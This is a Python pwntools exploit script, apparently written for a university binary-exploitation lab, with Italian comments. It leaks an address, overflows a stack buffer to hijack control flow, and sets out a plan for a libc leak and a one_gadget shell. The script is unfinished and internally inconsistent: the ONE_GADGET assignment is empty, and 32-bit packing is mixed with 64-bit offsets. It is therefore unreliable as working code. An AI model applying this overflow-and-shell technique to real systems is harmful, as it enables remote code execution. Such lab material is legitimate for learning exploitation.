#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 10)
EXE_FILENAME = '../pwn_student_binaries/call_me_Federico-Conti'
argv = [EXE_FILENAME]
envp = {}


OFFSET_RIP = 192  # thanks pwn cyclic :)

LIBC_LEAK = OFFSET_RIP + 8
POP_RDI = 0x000000000010f78b # ropper --file ./libc.so.6  --search 'pop rdi'
RET = POP_RDI+1 #; ret

ONE_GADGET =  # scelgiare da one_gadget libc.so.6


"""
$ one_gadget libc.so.6 
0xdff30 execve("/bin/sh", [ebp-0x30], esi)
constraints:
  address ebp-0x24 is writable
  [ebp-0x2c] is the GOT address of libc
  [[ebp-0x30]] == NULL || [ebp-0x30] == NULL || [ebp-0x30] is a valid argv
  [esi] == NULL || esi == NULL || esi is a valid envp

0xdff33 execve("/bin/sh", [ebp-0x30], esi)
constraints:
  address ebp-0x24 is writable
  ecx is the GOT address of libc
  [[ebp-0x30]] == NULL || [ebp-0x30] == NULL || [ebp-0x30] is a valid argv
  [esi] == NULL || esi == NULL || esi is a valid envp

0xdff39 execve("/bin/sh", [ebp-0x30], esi)
constraints:
  address ebp-0x20 is writable
  ecx is the GOT address of libc
  [[ebp-0x30]] == NULL || [ebp-0x30] == NULL || [ebp-0x30] is a valid argv
  [esi] == NULL || esi == NULL || esi is a valid envp

0xdff40 execve("/bin/sh", [ebp-0x30], esi)
constraints:
  address ebp-0x30 is writable
  ecx is the GOT address of libc
  [[ebp-0x30]] == NULL || [ebp-0x30] == NULL || [ebp-0x30] is a valid argv
  [esi] == NULL || esi == NULL || esi is a valid envp
"""

def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(EXE_FILENAME)

io = start()


                                #LEAK2#
lyrics = [
    b"Color me your color, baby",
    b"Color me your car",
    b"Color me your color, darling",
]

for idx, line in enumerate(lyrics, 1):
    io.sendlineafter(f"Enter line #{idx}:".encode(), line)

# &target= 0xflag()Address
data = io.recvuntil(b"Enter line #4:")
text = data.decode(errors="ignore")

match = re.search(r"0x[0-9a-fA-F]+", text)
if not match:
    log.failure("No address found in output")
    io.close()
    exit(1)

gadget = int(match.group(0), 16)
log.success(f"Gadget - flag() abs addr: {hex(gadget)}")

payload  = b"A" * OFFSET_RIP

## necessario RET to quiz() per continuare il ciclo, altrimenti crasha perche i byte sono > 0x50
payload += p32(gadget + 0x10b)      # EIP = flag() + 0x10b = quiz, dove  0x10b Ã¨ l  offset di quiz() rispetto a flag() ... thnaks Ghidra :)
io.sendline(payload)


                                    #LEAK2#
"""
Obbiettivo, ottenere un leak della libc tramite un buffer overflow, calcolare la base address della libc,
e sfruttare un one_gadget per ottenere una shell.

1- Bisogna LEAKARE un indirizzo interno assoluto a runtime della libc dove il main torna dopo ha finito la sua esecuzione.
2- Calcolare la base address della libc [libc_base] sottraendo l'offset noto di quell'istruzione interna alla libc (0x15c1)
3- Costruire il payload dove al posto dell IP posizionato nello stack del main inserimao il libc_base+one_gadget 

"""



io.interactive()
